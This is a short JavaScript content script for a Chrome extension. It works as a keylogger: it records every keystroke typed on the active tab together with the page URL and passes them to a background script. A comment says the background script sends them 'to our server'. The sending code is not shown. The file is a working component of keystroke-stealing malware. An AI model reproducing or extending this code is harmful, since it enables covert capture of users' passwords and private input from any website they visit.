chrome.runtime.onConnect.addListener(function(port){});

var k = "";
var data = {};

window.onkeydown = function(event){ //get keystrokes on active tab
    //alert(event.key);

    if(event.key.length > 1){
        k = " ("+event.key+") ";
    } else {
        k = event.key;
    }
    data = {
        key : k,                        //on background.js, key will be k and page will be window.location.href
        page: window.location.href
    }
    chrome.runtime.sendMessage(data);  //send message to background.js so background.js
    // can send the data to our server since content.js is unable to make request
}